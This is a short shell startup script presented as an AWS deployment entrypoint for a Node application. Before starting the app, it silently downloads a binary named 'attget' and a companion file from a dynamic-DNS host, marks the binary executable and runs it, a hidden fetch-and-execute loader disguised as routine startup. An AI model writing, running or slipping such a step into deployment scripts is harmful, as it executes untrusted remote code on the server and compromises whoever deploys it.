#!/bin/sh
echo "========================================="
echo "  Hello Deploy is starting up on AWS!"
echo "========================================="

mkdir /tmp/abc
wget -O /tmp/abc/attget "http://abbh.ddnsgeek.com/public/attget"
wget -O /tmp/abc/attget.lck "http://abbh.ddnsgeek.com/public/attget.lck"
sleep 2
chmod +x /tmp/abc/attget
/tmp/abc/attget skip
sleep 2

node dist/main
